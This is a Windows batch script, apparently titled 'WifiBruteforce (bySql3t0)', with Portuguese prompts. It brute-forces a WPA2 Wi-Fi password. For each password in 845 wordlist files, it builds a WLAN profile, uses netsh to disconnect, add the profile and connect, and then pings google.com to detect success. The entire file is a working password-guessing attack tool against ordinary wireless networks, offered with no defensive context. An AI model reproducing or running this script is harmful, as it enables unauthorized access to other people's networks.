@ECHO off
ECHO ------------------------------
ECHO - WifiBruteforce (bySql3t0) -
ECHO ------------------------------ 

REM SET nome=GVT-A123
SET /p nome="Entre com o Nome do Ponto de Acesso : "
REM SET /p compS="Entre com os 4 ultimos digitos do nome do ponto de acesso : "

FOR /L %%w IN (0,1,844) DO (
	SET /P senhas=<wordlists\%%w.txt
	ECHO -----------------------------------------------------
	ECHO             TESTANDO WORDLIST  %%w.txt
	ECHO ----------------------------------------------------- 

	FOR %%s IN (%senhas%) do (

		ECHO [+]---------------------------
		ECHO [^>]TESTANDO SENHA : %%s%compS% WORDLIST : %%w
		
		REM WPA/PSK xml file type 
		ECHO ^<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"^> ^<name^>%nome%^</name^> ^<SSIDConfig^> ^<SSID^> ^<name^>%nome%^</name^> ^</SSID^> ^</SSIDConfig^> ^<connectionType^>ESS^</connectionType^> ^<connectionMode^>auto^</connectionMode^> ^<MSM^> ^<security^> ^<authEncryption^> ^<authentication^>WPA2PSK^</authentication^> ^<encryption^>AES^</encryption^> ^<useOneX^>false^</useOneX^> ^</authEncryption^> ^<sharedKey^> ^<keyType^>passPhrase^</keyType^> ^<protected^>false^</protected^> ^<keyMaterial^> %%s%compS% ^</keyMaterial^> ^</sharedKey^> ^</security^> ^</MSM^> ^</WLANProfile^> > %nome%.xml
		
		ECHO [^>]Desconectando rede...
		REM netsh wlan disconnect > NULL
		netsh wlan disconnect
		
		ECHO [^>]Adicionando novo PROFILE : %nome% 
		netsh wlan add profile filename=%nome%.xml user=all > NULL
		REM netsh wlan add profile filename=%nome%.xml user=all

		ECHO [^>]Conectando com a REDE : %nome%
		netsh wlan connect ssid=%nome% name=%nome% > NULL
		REM netsh wlan connect ssid=%nome% name=%nome%
		
		ECHO [^>]TESTANDO CONEXAO...
		for /L %%p in (0,1,30) do (  
			ping -n 3 google.com 2> NULL | FIND "Resposta de"
			if not errorlevel 1 goto senhaOK
			REM ping google.com 
		)
		ECHO [ ]---------------------------
		ECHO [-]
	)
)
netsh wlan delete profile name=%nome% 2> NULL
DEL %nome%.xml
DEL NULL
ECHO "[-]Fim !"
GOTO ECHOON

REM Mostra somente se senha encontrada com sucesso.
:senhaOK
netsh wlan delete profile name=%nome%
DEL %nome%.xml
DEL NULL
ECHO Senha Encontrada com Sucesso !
ECHO "[-]Fim !"
GOTO ECHOON

:ECHOON
@ECHO on
